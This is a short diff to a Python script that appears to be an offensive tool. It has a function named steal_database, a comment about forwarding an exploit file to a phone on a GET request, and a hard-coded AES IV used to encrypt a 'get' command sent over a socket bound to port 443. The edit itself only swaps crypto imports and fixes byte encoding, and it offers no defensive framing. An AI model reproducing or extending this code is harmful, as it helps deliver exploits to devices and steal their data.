@@ -1,6 +1,6 @@
 import http.server, socket, sqlite3, json, requests, datetime, os
+from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes
 from Crypto.Cipher import AES
-from Crypto import Random
 
 # uses port 12345, ensure later processes use a different port
 # TODO move the desired exploit file into this directory so it will be forwarded to the phone when GET request received
@@ -33,7 +33,7 @@ def steal_database():
     print(bytes.fromhex(key))
     iv = "5468697320697320616e204956343536"
     obj = AES.new(bytes.fromhex(key), AES.MODE_CBC, bytes.fromhex(iv))
-    ciphertext = obj.encrypt("get0000000000000")
+    ciphertext = obj.encrypt(b"get" + b"\x00" * 13)
     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     port = 443             
     s.bind(('', port))
